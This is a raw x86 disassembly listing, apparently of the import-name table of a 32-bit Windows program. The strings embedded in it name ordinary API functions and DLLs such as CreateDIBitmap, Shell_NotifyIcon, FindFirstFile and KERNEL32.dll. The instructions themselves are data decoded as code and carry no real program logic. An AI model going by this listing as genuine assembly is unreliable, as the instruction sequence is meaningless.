  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
